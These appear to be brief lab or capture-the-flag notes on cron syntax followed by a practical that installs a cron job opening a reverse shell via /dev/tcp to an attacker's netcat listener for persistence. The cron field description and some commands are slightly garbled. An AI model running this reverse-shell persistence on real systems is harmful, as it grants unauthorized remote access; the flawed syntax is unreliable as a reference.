### Anatomy of a Cron job
* ***** [command to execute]
* Where A = min (0-59)
* B = hour(0-23)
* C = day of month (1-31)
* D = day of week (0-7)
* ***** = Means that the cron job will run every minute of every hour of every day of every month and every day of the week.

* PRACTICAL
* `ssh [username]@[Target IP]`
* `cat /etc/cron`
* `echo "***** /bin/bash -c 'bash -i >& /dev/tcp/[Attackers' IP on which netcat listener is running]/[any free port on the attacker] 0>&1'" > [output file name]`
* Check if it is done correctly --> `cat cron`
* **Ad the Cron job**
  * `crontab -i [Cron Output file name]`
 
* **View the list of Cron jobs**
  * `crontab -l'
* `rm wait`
* Removing this binary will log us out of the student account
* So we have to setup a listener on the attacker:
* `nc -nvlp [port specified in the echo command previously]`
* This should give us the student account back.
